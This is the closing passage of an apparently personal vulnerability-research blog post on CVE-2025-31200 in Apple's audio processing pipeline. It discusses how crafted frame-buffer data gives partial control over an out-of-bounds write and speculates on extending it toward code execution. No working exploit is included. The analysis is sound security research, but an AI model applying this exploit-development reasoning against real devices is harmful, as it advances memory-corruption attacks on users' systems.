</span></span></span><span><span>16</span><span><span></span>                                                            <span>channelLayout</span><span>:</span><span>channelLayout</span><span>];</span>
</span></span><span><span>17</span><span><span>}</span></span></span></code></pre></div><p>then that creates a situation where there are actually valid pointers that can be dereferenced later as floats without causing a null pointer dereference. In this case, it only crashes much later (if at all) due to actual heap corruption.</p>
<p>If we fill the frame buffers with different data, then the address reported in the segfault changes in proportion to the values we pick, so there is some control over the write doing this. It’s still unclear to me at this point what exact stage of the processing pipeline the frame data is in. If we knew, then perhaps we could write an arbitrary value into a (seemingly) arbitary location in memory.</p>
<p>Although, it is possible that the primitive here is fundamentally tied to how these floats are being manipulated at this point. For example, this code might be applying some series of audio processing related functions to our input values that make it so they are always basically always going to be unwieldy to work with. Imagine if the primitive is that you can write n 8 byte sequences out of bounds, but they must be valid 32 bit floats in the range x-y, that had to return valid sequences when passed through however many audio processing functions. That would really constrain the space of what could be written out of bounds.</p>
<p>Of course, we know that this was actively exploited in the wild, and there have been exploits that did a lot more with a lot less. Still, I am curious to see how this is pushed to full code execution. At this point though, I have done what I set out to do: understand CVE-2025-31200, and I want to get this out so that other people can take a look as well.</p>
<p>Some folks have already reached out to me saying that they think they may have found how to push it further, so look out for anything from them. I may put out a part two to this with more details on how the exploit actually would have worked (for example the chain from this to the RPAC bug). Normally, it isn’t necessarily the actual exploit primitive that is the center of the story, but I think in this case it was a really interesting example of how tricky some of these bugs can be. Hopefully this investigation will be useful to others who want to do a similar kind of thing. I’m sure if you had a deep understand of Apples audio-processing pipeline (or probably computational audio in general) then it wouldn’t be too too difficult to find something like this, but the venn diagram of such people and people with enough knowledge to know how to look for these bugs is not particularly huge. That makes this attack surface quite a rich one!</p>

</div></div>
  </body>
</html>
